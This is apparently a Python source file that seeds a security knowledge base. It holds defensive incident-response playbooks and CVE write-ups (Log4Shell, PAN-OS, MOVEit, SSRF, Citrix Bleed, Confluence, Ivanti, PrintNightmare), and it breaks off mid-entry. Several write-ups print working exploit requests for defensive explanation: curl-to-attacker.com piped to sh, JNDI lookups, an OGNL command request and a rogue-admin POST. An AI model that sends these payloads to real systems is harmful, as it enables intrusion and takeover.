"""Production-grade reference security documents across all knowledge base categories.

Provides authentic, comprehensive technical documentation for air-gapped triage,
automated cross-scanner correlation, and RAG retrieval (10 documents per category, 50 total).
"""
from __future__ import annotations

from models.database import KBCategory

REFERENCE_DOCS: list[dict] = [
    # =========================================================================
    # 1. PLAYBOOKS (10 Documents)
    # =========================================================================
    {
        "title": "Ransomware Incident Response and Network Containment Playbook",
        "category": KBCategory.PLAYBOOK,
        "tags": ["ransomware", "incident_response", "containment", "playbook", "active_directory"],
        "content": """## Objective
Establish rapid, deterministic containment, forensic preservation, and eradication procedures when an active ransomware infection or pre-ransomware staging (e.g. Cobalt Strike beaconing, volume shadow copy deletion, PsExec lateral movement) is identified across enterprise assets.

## Execution Steps
1. Immediately isolate affected hosts from internal and guest VLANs using endpoint EDR network containment or perimeter switchport disconnection without powering down system hardware.
2. Invalidate compromised Active Directory user and service accounts, and execute a two-stage Kerberos KRBTGT account password reset spaced 10 hours apart to nullify all forged Golden Tickets.
3. Block lateral SMB egress across internal workstation subnets by enforcing host firewall drops on TCP ports 445, 139, 135, and 5985/5986.
4. Capture volatile physical memory (RAM) and uncommitted command histories from patient-zero systems using WinPmem or LiME prior to system reboot.
5. Extract and preserve Windows Event logs (Security Event ID 4688 with full command lines, Event ID 7045 service creation, and Event ID 1102 log wiping) to an immutable syslog target.
6. Verify offline, immutable, or air-gapped backup snapshot integrity and confirm absence of staging malware signatures before initiating system restoration.
7. Re-image affected endpoints from verified tamper-proof golden images and re-establish network connectivity strictly through isolated staging subnets with continuous packet inspection.""",
    },
    {
        "title": "Remote Code Execution (RCE) Emergency Response & Patching Playbook",
        "category": KBCategory.PLAYBOOK,
        "tags": ["rce", "cve", "patching", "emergency", "playbook", "perimeter"],
        "content": """## Objective
Deliver zero-delay perimeter isolation, egress restriction, and emergency hotfix deployment upon detection or disclosure of critical Remote Code Execution vulnerabilities (CVSS 9.0–10.0, CISA KEV) across internet-facing ingress points or internal infrastructure.

## Execution Steps
1. Deploy emergency Web Application Firewall (WAF) virtual patch signatures and layer-7 URL filtering rules matching known exploitation payloads within 60 minutes of disclosure.
2. Sever outbound internet egress from application and database tiers for non-essential protocols, specifically blocking unauthorized outbound LDAP (port 389), RMI (port 1099), DNS (port 53 to foreign resolvers), and raw TCP reverse shells.
3. Restrict administrative management access (SSH port 22, RDP port 3389, and web management consoles) to approved Zero Trust Network Access (ZTNA) bastion IP ranges.
4. Stage vendor-supplied emergency patches or temporary workarounds in an isolated test environment and validate backward compatibility with production dependencies.
5. Deploy hotfix across all production instances under emergency change control and execute authenticated credentialed vulnerability scans to confirm remediation.
6. Inspect web server document roots, temporary storage (/tmp, %TEMP%), crontabs, and scheduled tasks for newly dropped web shells (.php, .jsp, .aspx, .sh) or rogue persistence mechanisms.""",
    },
    {
        "title": "Active Directory Kerberoasting & Credential Theft Response Playbook",
        "category": KBCategory.PLAYBOOK,
        "tags": ["active_directory", "kerberos", "kerberoasting", "spn", "credential_theft", "playbook"],
        "content": """## Objective
Detect, investigate, and eradicate Active Directory Kerberoasting campaigns where adversaries request Service Principal Name (SPN) Kerberos TGS tickets with weak RC4 encryption to crack plaintext service account credentials offline.

## Execution Steps
1. Identify target service accounts under attack by querying domain controller Security Event Logs for Event ID 4769 where Ticket Encryption Type is 0x17 (RC4-HMAC) and Failure Code is 0x0.
2. Correlate the requesting IP address and computer account from Event ID 4769 with DHCP leases and network telemetry to pinpoint the compromised internal patient-zero workstation.
3. Immediately rotate passwords for all targeted SPN-linked service accounts to complex 32-character random passphrases, or migrate them directly to Group Managed Service Accounts (gMSA).
4. Update Active Directory Kerberos policy via Group Policy Objects (GPO) to disable legacy RC4 encryption, enforcing AES-128 and AES-256 Kerberos ticket encryption across the domain.
5. Add all high-privilege administrative and tier-0 accounts to the Active Directory 'Protected Users' security group to prohibit credential caching and weak ticket negotiation.
6. Quarantine the compromised workstation, dump memory to check for Mimikatz or Rubeus injection artifacts, and review Event ID 4624 logon types for subsequent lateral movement.
7. Audit Active Directory for unauthorized replication requests (DCSync) in Event ID 4662 targeting DS-Replication-Get-Changes-All extended rights.""",
    },
    {
        "title": "Cloud & AWS S3 Bucket Sensitive Data Leak Containment Playbook",
        "category": KBCategory.PLAYBOOK,
        "tags": ["aws", "s3", "cloud_security", "data_leak", "incident_response", "iam"],
        "content": """## Objective
Provide an operational checklist for rapidly mitigating unauthorized public exposure of cloud object storage (Amazon S3 buckets, Azure Blob containers), preventing ongoing data exfiltration and securing IAM access credentials.

## Execution Steps
1. Immediately enforce S3 Account-Level Public Access Block (BlockPublicAcls, IgnorePublicAcls, BlockPublicPolicy, RestrictPublicBuckets) via AWS CLI or Management Console.
2. Revoke and invalidate all IAM access keys, temporary STS credentials, and role assumptions associated with identities that modified bucket ACLs or access policies.
3. Query AWS CloudTrail and S3 Server Access Logs for the previous 90 days, filtering for GetObject, ListBucket, and PutBucketPolicy API calls originating from non-corporate IP addresses.
4. Export and freeze object storage access logs and S3 access analysis reports to an isolated forensic S3 bucket protected with Object Lock in Compliance mode.
5. Scan bucket contents with automated discovery tools to categorize exposed data classes (personally identifiable information, payment cards, cryptographic keys, source code).
6. Apply server-side encryption with AWS KMS Customer Managed Keys (SSE-KMS) and update bucket policies to enforce TLS 1.2+ transit with aws:SecureTransport conditions.
7. Deploy AWS Config rule 's3-bucket-public-read-prohibited' and 's3-bucket-ssl-requests-only' with automated Lambda remediation handlers to block future regression.""",
    },
    {
        "title": "Distributed Denial of Service (DDoS) & Volumetric Flood Mitigation Playbook",
        "category": KBCategory.PLAYBOOK,
        "tags": ["ddos", "bgp", "scrubbing", "rate_limiting", "perimeter", "incident_response"],
        "content": """## Objective
Execute structured mitigation steps during large-scale Layer 3/4 volumetric floods (SYN floods, UDP reflection/amplification, GRE floods) or Layer 7 HTTP application floods targeting critical public edge infrastructure.

## Execution Steps
1. Determine attack vector and magnitude by inspecting edge NetFlow/sFlow telemetry, categorizing packet rate (Mpps), bandwidth (Gbps), and protocol distribution.
2. Activate upstream ISP or cloud scrubbing center BGP Anycast diversion via BGP community announcement to reroute incoming traffic through DDoS mitigation centers.
3. Apply Layer 4 stateless rate-limiting access control lists (ACLs) on border routers dropping NTP (UDP 123), DNS (UDP 53 from external sources to edge hosts), and SSDP (UDP 1900) reflection amplification.
4. Enable SYN proxy and SYN cookies on edge firewalls and load balancers to exhaust spoofed TCP SYN state table consumption.
5. Deploy Web Application Firewall (WAF) managed challenge rules (cryptographic JavaScript challenge or Managed CAPTCHA) targeting high-frequency HTTP GET/POST endpoints.
6. Configure aggressive client rate limiting per source IP on reverse proxies (e.g., limit_req zone in Nginx) and drop requests with anomalous or empty User-Agent headers.
7. Monitor origin server CPU and connection pool metrics continuously, scaling autoscaling groups and backend database connection pools to absorb residual legitimate load.""",
    },
    {
        "title": "Business Email Compromise (BEC) & Tenant Hijacking Eradication Playbook",
        "category": KBCategory.PLAYBOOK,
        "tags": ["bec", "email_security", "o365", "exchange", "phishing", "incident_response"],
        "content": """## Objective
Contain and remediate unauthorized cloud email tenant access, eliminating clandestine inbox forwarding rules, malicious OAuth applications, and fraudulent financial redirection communications.

## Execution Steps
1. Immediately revoke all active refresh tokens and user sessions for the compromised account via cloud identity admin portal (Revoke-AzureADUserAllRefreshToken).
2. Reset user credentials to a randomly generated passphrase and mandate re-registration of FIDO2 phishing-resistant hardware MFA keys.
3. Inspect and remove unauthorized Exchange mailbox inbox rules, focusing on rules that forward messages externally or redirect messages containing 'invoice', 'payment', 'wire', or 'bank' to RSS Subscriptions.
4. Audit Microsoft Entra ID / Google Workspace for illicit third-party OAuth app consents (Application Permissions granting Mail.ReadWrite or Mail.Send) and immediately revoke enterprise consent.
5. Query unified audit logs for all Sent Items and deleted items during the breach window to inventory fraudulent wire instructions or phishing lures dispatched to customers or suppliers.
6. Notify external financial institutions and vendor contacts targeted by fraudulent email messages, advising them to freeze wire transactions and verify payment details out-of-band.
7. Block suspicious external IP addresses and domains identified in authentication logs across enterprise email hygiene gateways and perimeter firewalls.""",
    },
    {
        "title": "Insider Threat Unauthorized Data Exfiltration Investigation Playbook",
        "category": KBCategory.PLAYBOOK,
        "tags": ["insider_threat", "dlp", "data_exfiltration", "forensics", "investigation"],
        "content": """## Objective
Investigate, contain, and legally preserve evidence of intentional or accidental intellectual property theft, bulk data exfiltration, or unauthorized mass downloads by privileged internal personnel.

## Execution Steps
1. Invalidate Active Directory, VPN, and SaaS access tokens for the subject employee quietly in coordination with Legal, HR, and Information Security leadership.
2. Isolate the user's primary endpoint, remote desktop profiles, and mobile device management (MDM) sessions without alerting the subject to prevent deliberate evidence destruction.
3. Export and freeze Endpoint DLP logs, USB storage connection histories (Windows Event ID 20001, USBSTOR registry keys), and cloud storage sync activity (OneDrive, Box, Google Drive).
4. Create forensic bit-stream disk images of physical workstations using write-blocking hardware and capture volatile RAM for immediate keyword analysis.
5. Analyze web proxy and firewall egress logs for large HTTP POST transfers or SFTP uploads to non-approved personal cloud storage accounts or file-sharing drop sites.
6. Review source code repository clones (git pull/clone bursts) and database query telemetry (mass SELECT operations exceeding normal baseline thresholds).
7. Compile a chain-of-custody forensic timeline report detailing dates, timestamps, file names, hash digests, and transfer destinations for Legal Counsel and law enforcement referral.""",
    },
    {
        "title": "Supply Chain CI/CD Pipeline & Build Runner Tampering Containment Playbook",
        "category": KBCategory.PLAYBOOK,
        "tags": ["supply_chain", "cicd", "github_actions", "pipeline", "containment", "playbook"],
        "content": """## Objective
Contain and eradicate unauthorized access to automated build infrastructure (GitHub Actions runners, GitLab CI, Jenkins nodes), preventing malicious backdoors from being compiled into production software releases.

## Execution Steps
1. Immediately pause all automated CI/CD deployment pipelines and suspend publishing access to artifact registries (Docker Hub, PyPI, npm, Artifactory).
2. Revoke and rotate all CI/CD pipeline secrets, deployment SSH keys, cloud provisioning credentials (AWS IAM roles, GCP Service Account keys), and signing certificates.
3. Terminate and destroy ephemeral build runner virtual machines and container instances, quarantining disk volumes for offline forensic analysis.
4. Audit recent commit histories and pull request merge events for unauthorized workflow file alterations (.github/workflows/*.yml, Jenkinsfile, gitlab-ci.yml).
5. Compare cryptographic SHA-256 hashes of compiled artifacts currently in production against verified source code build trees using reproducible build tooling.
6. Enforce mandatory branch protection rules requiring multiple independent senior code approvals and signed git commits (GPG/SSH commit signatures).
7. Re-initialize build pipelines exclusively on hardened, ephemeral, single-use runner environments with strict network egress filtering restricted to approved repository domains.""",
    },
    {
        "title": "SQL Injection (SQLi) Emergency Triage & Virtual Patching Playbook",
        "category": KBCategory.PLAYBOOK,
        "tags": ["sqli", "waf", "database", "incident_response", "web_security", "virtual_patch"],
        "content": """## Objective
Deliver immediate perimeter neutralization, database forensic auditing, and emergency source code parameterization upon active SQL injection exploitation against production database backends.

## Execution Steps
1. Identify vulnerable URL parameters, HTTP request headers, or JSON bodies from web server access logs and database slow query / error logs (e.g. syntax errors near UNION SELECT).
2. Deploy an emergency Web Application Firewall (WAF) regex inspection rule or custom Snort/Suricata signature at the perimeter load balancer to block requests matching the injection pattern.
3. Restrict database user account permissions to least privilege, revoking administrative functions (xp_cmdshell, LOAD_FILE(), pg_read_file(), INTO OUTFILE) immediately.
4. Inspect database audit logs for unauthorized schema alterations, table drops, or rogue administrative accounts inserted into user tables during the compromise window.
5. Isolate affected backend application nodes, replace raw SQL string concatenations with parameterized PreparedStatements or ORM query abstractions, and run automated regression tests.
6. Verify database integrity by comparing recent database dumps against immutable air-gapped snapshots to detect unauthorized record tampering.
7. Deploy the parameterized code release through expedited CI/CD change management and validate remediation with targeted non-destructive automated SQLi verification scans.""",
    },
    {
        "title": "Linux Rootkit & Kernel Module Persistence Eradication Playbook",
        "category": KBCategory.PLAYBOOK,
        "tags": ["rootkit", "linux", "kernel", "persistence", "forensics", "incident_response"],
        "content": """## Objective
Identify, isolate, and eradicate sophisticated kernel-level rootkits (e.g. eBPF implants, malicious loadable kernel modules, LD_PRELOAD hijacking) designed to hide processes, network sockets, and files from standard administrative tooling.

## Execution Steps
1. Sever network connectivity of the host immediately while preserving system power to maintain volatile kernel memory structures.
2. Capture volatile physical memory (RAM) using LiME (Linux Memory Extractor) or /dev/fmem to an external write-blocked storage medium for Volatility3 kernel profiling.
3. Check for unauthorized Loadable Kernel Modules by inspecting /proc/modules, lsmod output, and /sys/module/, comparing loaded modules against the distribution's cryptographically signed kernel module whitelist.
4. Inspect dynamic linker hijacking indicators in /etc/ld.so.preload and review environment variables (/etc/environment, systemd unit files) for suspicious LD_PRELOAD shared objects.
5. Verify integrity of system binaries (ps, netstat, lsof, top) against distribution package verification databases (rpm -Va or debsums -c) using clean external statically linked binaries.
6. Audit eBPF programs loaded into the kernel using 'bpftool prog list' and 'bpftool map list' to identify stealthy packet-filtering or syscall-hooking implants.
7. Decommission and perform complete clean reinstall from trusted golden media; never attempt partial in-place cleanup of kernel-level rootkit infections.""",
    },

    # =========================================================================
    # 2. VULNERABILITY WRITE-UPS (10 Documents)
    # =========================================================================
    {
        "title": "CVE-2021-44228 (Log4Shell) Remote Code Execution Technical Analysis",
        "category": KBCategory.VULN_WRITEUP,
        "tags": ["cve_2021_44228", "log4shell", "rce", "jndi", "critical", "cisa_kev"],
        "content": """## Executive Summary
CVE-2021-44228 (CVSS 10.0, Critical), colloquially termed Log4Shell, is an unauthenticated Remote Code Execution flaw in Apache Log4j versions 2.0-beta9 through 2.14.1. The flaw stems from insecure recursive lookup evaluation in the log message parser, allowing external attackers to trigger arbitrary Java class loading via crafted JNDI string expressions.

## Affected Systems & Scope
All enterprise Java services, microservices, and third-party enterprise platforms employing Apache Log4j-core releases between 2.0-beta9 and 2.14.1. This includes popular data platforms (Elasticsearch, Apache Spark, Solr), enterprise virtualization managers (VMware vCenter), and web application servers handling client-supplied strings such as User-Agent, X-Forwarded-For, or authentication request bodies.

## Threat Impact Analysis
Successful exploitation grants unauthenticated remote adversaries root or service-level command execution on the host operating system. Threat actors weaponize Log4Shell to establish interactive reverse shells, deploy cryptocurrency miners, drop Cobalt Strike beacons, and harvest cloud instance metadata (AWS IMDSv1). Due to ubiquitous enterprise deployment and trivial exploitation complexity, the vulnerability was immediately listed in the CISA Known Exploited Vulnerabilities (KEV) catalog.

## Evidence & Technical Details
The vulnerability activates when Log4j processes message strings containing nested JNDI lookup prefixes, formatted as: ${jndi:ldap://attacker-controlled-host:1389/ExploitClass} or ${jndi:rmi://attacker-controlled-host:1099/Object}. The vulnerable subcomponent (org.apache.logging.log4j.core.net.JndiManager) initiates an outbound directory lookup to the attacker-controlled LDAP server, deserializes the returned Java class payload, and executes the constructor without authentication.
Verification probe sample:
curl -H 'User-Agent: ${jndi:ldap://127.0.0.1:1389/probe}' http://target.internal:8080/api/login
Mitigation: Upgrade all log4j dependencies to version 2.17.1 or higher. On legacy systems where immediate upgrades are constrained, set JVM startup flag: -Dlog4j2.formatMsgNoLookups=true or remove the JndiLookup class from the log4j-core-*.jar classpath: zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class.""",
    },
    {
        "title": "CVE-2024-3400 (Palo Alto PAN-OS GlobalProtect) Command Injection Write-Up",
        "category": KBCategory.VULN_WRITEUP,
        "tags": ["cve_2024_3400", "pan_os", "command_injection", "rce", "cisa_kev", "perimeter"],
        "content": """## Executive Summary
CVE-2024-3400 (CVSS 10.0, Critical) is an unauthenticated OS command injection flaw in the GlobalProtect feature of Palo Alto Networks PAN-OS software. Exploitation enables an unauthenticated network adversary to execute arbitrary Linux commands with root privileges directly on the firewall appliance.

## Affected Systems & Scope
Palo Alto Networks firewalls running PAN-OS 10.2, PAN-OS 11.0, and PAN-OS 11.1 where both GlobalProtect gateway or portal configurations and device telemetry are simultaneously active. Non-firewall appliances or PAN-OS installations without GlobalProtect enabled on ingress interfaces are unaffected.

## Threat Impact Analysis
Because PAN-OS appliances terminate enterprise perimeter boundaries, remote root execution compromises the entirety of perimeter network defense. Exploited appliances serve as persistent pivot points for deep network traversal, credential exfiltration via memory extraction, and internal packet interception. Threat group UTA0218 demonstrated active zero-day exploitation in the wild, placing this vulnerability under mandatory federal emergency directive binding.

## Evidence & Technical Details
The root cause resides in improper sanitization of session cookie parameters processed by the telemetry collection daemon. An attacker issues an HTTP POST request to /ssl-vpn/hipreport.esp containing a crafted SESSID cookie value structured with shell metacharacters and directory traversal indicators:
POST /ssl-vpn/hipreport.esp HTTP/1.1
Host: vpn.enterprise.corp
Cookie: SESSID=../../../../opt/panlogs/tmp/device_telemetry/minute/`curl${IFS}attacker.com/payload|sh`;
Connection: close
When the telemetry generation cron job triggers, it concatenates the unsanitized session ID into a shell execution context, executing the embedded command string with root privileges. Forensic validation requires inspecting /var/log/pan/gpsvc.log for unexpected directory traversal tokens and reviewing telemetry staging directories under /opt/panlogs/tmp/.
Mitigation: Apply PAN-OS hotfixes 10.2.9-h1, 11.0.4-h1, or 11.1.2-h3 immediately. As a temporary compensating control, disable device telemetry until hotfix deployment completes.""",
    },
    {
        "title": "CVE-2023-34362 (MOVEit Transfer) SQL Injection & Privilege Escalation Analysis",
        "category": KBCategory.VULN_WRITEUP,
        "tags": ["cve_2023_34362", "moveit", "sqli", "data_exfiltration", "cisa_kev", "zero_day"],
        "content": """## Executive Summary
CVE-2023-34362 (CVSS 9.8, Critical) is a pre-authentication SQL injection vulnerability in Progress Software's MOVEit Transfer web application. An unauthenticated attacker can exploit SQL injection vulnerabilities in web-accessible endpoints to obtain unauthorized administrative database access, forge active session tokens, and exfiltrate stored files.

## Affected Systems & Scope
MOVEit Transfer on-premises installations across versions 2023.0.0 (15.0), 2022.1.x (14.1), 2022.0.x (14.0), and 2021.1.x (13.1). Applicable to both MySQL and Microsoft SQL Server backends hosting enterprise managed file transfer infrastructure.

## Threat Impact Analysis
Threat actor CL0P (FIN11) executed coordinated mass exploitation across thousands of corporate and government organizations. Exploitation yielded bulk exfiltration of sensitive payroll records, health records, and encrypted backup archives, followed by multi-million-dollar extortion demands. The flaw bypasses front-end authentication entirely, granting unrestricted database modification rights.

## Evidence & Technical Details
The vulnerability is triggered through the guestaccess.aspx and human.aspx endpoints where untrusted HTTP header values (specifically the X-siLock-Transaction and X-siLock-Comment headers) are passed directly into dynamic SQL query concatenations within the core application assembly (midTrans.dll).
Adversaries leverage the injection to insert rogue administrative sessions into the internal active_sessions table, subsequently uploading an obfuscated .NET webshell named 'human2.aspx' into the web root directory. The webshell parses incoming request headers, queries the MOVEit database for Azure Blob storage encryption keys, and streams requested files directly to remote C2 endpoints.
Forensic IOCs: Check for presence of 'human2.aspx' or 'moveit.asp' in C:\\MOVEitTransfer\\wwwroot\\, and inspect IIS W3C logs for anomalous POST requests to guestaccess.aspx with high byte transfer responses.
Mitigation: Apply vendor security patches (MOVEit 2023.0.2+, 2022.1.6+, 2022.0.5+), block public internet ingress to ports 80 and 443 on MOVEit servers until verified, and rotate all database credentials and encryption keys.""",
    },
    {
        "title": "CWE-918: Server-Side Request Forgery (SSRF) Cloud Metadata Abuse Technical Analysis",
        "category": KBCategory.VULN_WRITEUP,
        "tags": ["ssrf", "cwe_918", "cloud_metadata", "aws_imds", "privilege_escalation"],
        "content": """## Executive Summary
CWE-918 (Server-Side Request Forgery) occurs when a web application accepts a user-controlled URL and fetches remote resources without validating destination IP addresses, hostnames, or protocols. In cloud environments (AWS, Azure, GCP), SSRF enables adversaries to query internal instance metadata services and extract privileged IAM role credentials.

## Affected Systems & Scope
Web applications, document processors (PDF converters, image renderers, web hooks), and proxy microservices running in cloud environments (EC2, ECS, EKS) that accept target URLs via GET/POST parameters, JSON payloads, or XML external entity references.

## Threat Impact Analysis
Adversaries target the cloud Instance Metadata Service (IMDS at 169.254.169.254) to harvest temporary security credentials (AWS AccessKeyId, SecretAccessKey, Token). These credentials grant the adversary the full permissions of the IAM instance profile, frequently leading to privilege escalation, S3 data exfiltration, and full cloud infrastructure takeover.

## Evidence & Technical Details
An unvalidated webhook or thumbnail service accepts parameters such as:
POST /api/export-pdf HTTP/1.1
Content-Type: application/json
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/production-ec2-role"}
If the backend server forwards the request without boundary filtering, the metadata service responds with:
{
  "Code": "Success",
  "LastUpdated": "2026-11-13T12:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjE...",
  "Expiration": "2026-11-13T18:00:00Z"
}
Mitigation Strategy:
1. Enforce AWS IMDSv2 across all instances by requiring session-oriented tokens (PUT request with X-aws-ec2-metadata-token-ttl-seconds) and setting metadata token hop limit to 1.
2. Implement strict server-side URL validation against an explicit domain allowlist.
3. Resolve candidate domain names server-side and reject requests resolving to RFC 1918 private subnets (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8) or link-local ranges (169.254.0.0/16).""",
    },
    {
        "title": "CVE-2023-4966 (Citrix Bleed) NetScaler ADC Sensitive Information Disclosure Analysis",
        "category": KBCategory.VULN_WRITEUP,
        "tags": ["cve_2023_4966", "citrix_bleed", "netscaler", "session_hijacking", "cisa_kev"],
        "content": """## Executive Summary
CVE-2023-4966 (CVSS 9.4, Critical), known as 'Citrix Bleed', is an unauthenticated buffer over-read vulnerability in Citrix NetScaler ADC and NetScaler Gateway appliances. When configured as a gateway (VPN, ICA proxy, RDP proxy) or AAA virtual server, an unauthenticated attacker can extract chunks of process memory containing valid, multi-factor authenticated user session tokens.

## Affected Systems & Scope
NetScaler ADC and NetScaler Gateway versions 14.1 before 14.1-8.50, 13.1 before 13.1-49.15, 13.0 before 13.0-92.19, and NetScaler ADC 13.1-FIPS / 12.1-FIPS. Exploitable exclusively when the appliance has an active Gateway or AAA virtual server endpoint.

## Threat Impact Analysis
Adversaries replay extracted session cookies directly to the NetScaler gateway interface, completely bypassing username, password, and second-factor (MFA/OTP) authentication prompts. This provides immediate, authenticated network ingress into internal corporate subnets. Multiple ransomware affiliates deployed this exploit for initial corporate network access.

## Evidence & Technical Details
The vulnerability exists within the OpenID Connect discovery endpoint (/oauth/idp/.well-known/openid-configuration). Sending an HTTP GET request containing an excessively long Host header triggers an unconstrained snprintf memory copy in nsppe (NetScaler Packet Processing Engine). The response leaks adjacent process heap memory, including active 32-byte hexadecimal session tokens:
GET /oauth/idp/.well-known/openid-configuration HTTP/1.1
Host: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa... [repeated 24,000 bytes]
The response body contains raw memory bytes terminating with active session cookies matching the format: NSC_AAAC=...
Mitigation: Upgrade NetScaler appliances to fixed firmware versions immediately. Crucially, applying the patch alone does not invalidate tokens harvested prior to patching; administrators must terminate all active sessions via the CLI command: 'kill aaa session -all' and force global credential resets.""",
    },
    {
        "title": "CVE-2022-26134 (Atlassian Confluence OGNL Injection) Remote Code Execution Analysis",
        "category": KBCategory.VULN_WRITEUP,
        "tags": ["cve_2022_26134", "confluence", "ognl", "rce", "atlassian", "cisa_kev"],
        "content": """## Executive Summary
CVE-2022-26134 (CVSS 9.8, Critical) is an unauthenticated, pre-auth Object-Graph Navigation Language (OGNL) injection vulnerability affecting Atlassian Confluence Server and Confluence Data Center. An external attacker can execute arbitrary code in the security context of the Confluence user by submitting crafted HTTP GET requests containing OGNL expressions in the URI path.

## Affected Systems & Scope
Confluence Server and Data Center versions 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1 and all preceding unsupported versions. Cloud-hosted Atlassian sites (atlassian.net) were unaffected.

## Threat Impact Analysis
Unauthenticated adversaries achieve instant, reliable remote code execution with the permissions of the 'confluence' service account. Attackers routinely weaponized this flaw to drop cryptocurrency miners, deploy webshells, exfiltrate confluence wikis containing sensitive credentials, and pivot deeper into internal server subnets.

## Evidence & Technical Details
The flaw exists because the Confluence web framework passes the incoming request URI into OGNL expression evaluation when rendering error pages or routing actions. Placing an OGNL expression inside the URL path (e.g., /%24%7B%28%23a%3D...%29%7D/) forces the OGNL evaluator to execute Java runtime invocations:
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%7D/ HTTP/1.1
Host: confluence.internal.corp
The server executes the shell command 'id' and returns the command output directly inside the X-Cmd-Response HTTP header.
Mitigation: Upgrade Confluence instances to versions 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, or 7.18.1. For air-gapped instances awaiting maintenance windows, replace xwork-1.0.3.6.jar with the patched vendor jar file or enforce strict layer-7 WAF URI block rules for '%24%7B' strings.""",
    },
    {
        "title": "CVE-2023-22515 (Atlassian Confluence Broken Access Control) Root Account Creation Analysis",
        "category": KBCategory.VULN_WRITEUP,
        "tags": ["cve_2023_22515", "confluence", "broken_access_control", "privilege_escalation", "cisa_kev"],
        "content": """## Executive Summary
CVE-2023-22515 (CVSS 10.0, Critical) is a critical broken access control vulnerability in Atlassian Confluence Data Center and Server. An unauthenticated attacker can access the initial setup wizard on an already-configured production Confluence instance, create a new local administrator account, and gain full administrative control of the application.

## Affected Systems & Scope
Confluence Data Center and Server versions 8.0.0 through 8.0.4, 8.1.0 through 8.1.4, 8.2.0 through 8.2.3, 8.3.0 through 8.3.2, 8.4.0 through 8.4.2, and 8.5.0 through 8.5.1. Instances hosted on Atlassian Cloud are not affected.

## Threat Impact Analysis
Exploitation grants immediate, complete control of the Confluence application, enabling adversaries to view all proprietary wiki spaces, delete spaces, install malicious plugins containing backdoors, and modify system settings. CISA added CVE-2023-22515 to its KEV catalog following widespread nation-state exploitation.

## Evidence & Technical Details
The vulnerability resides in the /setup/setupadministrator.action endpoint. When Confluence is running, setup endpoints are intended to be inaccessible. However, by manipulating request parameters (e.g. sending requests to /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false), an attacker can reset the internal 'setupComplete' state property in memory.
Subsequently, the attacker issues a POST request to /setup/setupadministrator.action:
POST /setup/setupadministrator.action HTTP/1.1
Host: confluence.corp.local
Content-Type: application/x-www-form-urlencoded
username=rogueadmin&fullName=Rogue+Admin&email=admin%40attacker.com&password=ComplexPassword123!&confirm=ComplexPassword123!
The application provisions a new administrator user in the confluence-administrators group.
Mitigation: Upgrade to Confluence versions 8.3.3, 8.4.3, 8.5.2, or higher. As a temporary mitigation, block external network access to the /setup/* path at the reverse proxy or WAF layer.""",
    },
    {
        "title": "CVE-2024-21887 (Ivanti Connect Secure) Command Injection in Web Components Analysis",
        "category": KBCategory.VULN_WRITEUP,
        "tags": ["cve_2024_21887", "ivanti", "command_injection", "vpn", "cisa_kev", "zero_day"],
        "content": """## Executive Summary
CVE-2024-21887 (CVSS 9.1, Critical) is an authenticated command injection vulnerability in the web components of Ivanti Connect Secure (formerly Pulse Secure) and Policy Secure gateways. When chained with an authentication bypass (CVE-2023-46805), unauthenticated remote attackers can execute arbitrary OS commands with root privileges.

## Affected Systems & Scope
Ivanti Connect Secure versions 9.x and 22.x, and Ivanti Policy Secure versions 9.x and 22.x terminating enterprise remote access connections.

## Threat Impact Analysis
Ivanti Connect Secure appliances provide core perimeter VPN tunnels into private corporate networks. Root compromise of these appliances grants state-sponsored threat actors (e.g., UTA0178) complete visibility into decrypted corporate traffic, ability to extract active user credentials from system memory, and ability to plant stealthy web shells (GLASSTOKEN, WIREFIRE) that survive firmware updates.

## Evidence & Technical Details
The injection vulnerability occurs in several REST API endpoints, including /api/v1/license/keys-status/. The endpoint accepts user-supplied parameters and interpolates them directly into a Python subprocess execution without sanitization:
GET /api/v1/totp/user-backup-code/../../license/keys-status/;curl%20http://attacker.com/sh|sh; HTTP/1.1
Host: vpn.enterprise.com
Bypassing the authentication layer via path traversal (CVE-2023-46805) allows the unauthenticated attacker to hit the license endpoint and execute the shell payload with root authority.
Mitigation: Import Ivanti's mitigation XML configuration file immediately to block the vulnerable API endpoints, run Ivanti's External Integrity Checker Tool (ICT) to detect dropped persistence files, and schedule full firmware upgrades to patched releases (e.g., 9.1R18.3+, 22.7R1.1+).""",
    },
    {
        "title": "CVE-2021-34527 (PrintNightmare) Windows Print Spooler Remote Code Execution Technical Analysis",
        "category": KBCategory.VULN_WRITEUP,
        "tags": ["cve_2021_34527", "printnightmare", "windows", "print_spooler", "rce", "cisa_kev"],
        "content": """## Executive Summary
CVE-2021-34527 (CVSS 8.8, High), designated PrintNightmare, is a critical remote code execution vulnerability in the Windows Print Spooler service (spoolsv.exe). The flaw allows an authenticated domain user to install a malicious print driver remotely, leading to arbitrary code execution with SYSTEM privileges on targeted Windows machines, including Domain Controllers.

## Affected Systems & Scope
All supported versions of Microsoft Windows Server (2008 through 2022) and Windows client operating systems (Windows 7 through Windows 11) where the Print Spooler service is enabled.

## Threat Impact Analysis
In Active Directory domains, any low-privileged domain user (or compromised workstation service account) can target Domain Controllers running the Print Spooler service. Because the spooler service runs with NT AUTHORITY\\SYSTEM privileges, successful exploitation yields immediate, complete Domain Admin takeover within minutes of initial network ingress.

## Evidence & Technical Details
The vulnerability stems from improper authorization validation in the RpcAddPrinterDriverEx() API call exposed via the MS-RPRN RPC interface. An attacker calls RpcAddPrinterDriverEx with a path to a malicious DLL hosted on an attacker-controlled SMB share:
RpcAddPrinterDriverEx(pName="\\\\dc01.corp.local", pDriverContainer={pDriverInfo: {pConfigFile: "\\\\attacker\\share\\payload.dll", ...}})
